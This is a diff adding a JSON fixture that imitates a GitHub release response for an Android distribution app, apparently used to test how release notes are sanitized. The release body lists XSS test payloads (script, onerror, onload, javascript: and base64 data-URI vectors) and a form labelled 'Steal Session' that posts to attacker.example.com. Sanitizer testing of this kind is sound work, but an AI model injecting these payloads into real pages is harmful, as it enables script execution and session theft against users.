@@ -1,0 +1,14 @@
+{
+  "tag_name": "v1.2.0-sec",
+  "name": "Security Audit Release",
+  "body": "## Standard Features\n- High contrast support\n\n### Injection Test Vectors\n<script>window.__xss_flag = true; alert('XSS');</script>\n<img src=\"x\" onerror=\"window.__xss_flag = true;\" />\n<svg onload=\"window.__xss_flag = true;\"><circle r=\"5\"/></svg>\n<iframe src=\"javascript:alert(1)\"></iframe>\n<form action=\"https://attacker.example.com\"><button>Steal Session</button></form>\n<a href=\"javascript:window.__xss_flag=true;\">Malicious Link</a>\n<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Data URI Exploit</a>\n\n### Legitimate Safe Content\n- **Bold text** and *italic text*\n- `inline code block`\n- [Legitimate Official Portal](https://official.colddrinkdist.example.com)",
+  "assets": [
+    {
+      "id": 508,
+      "name": "cold-drink-agency-v1.2.0-sec.apk",
+      "content_type": "application/vnd.android.package-archive",
+      "size": 25000000,
+      "browser_download_url": "https://github.com/LogarTraders/cold-drink-distribution-app/releases/download/v1.2.0-sec/cold-drink-agency-v1.2.0-sec.apk"
+    }
+  ]
+}
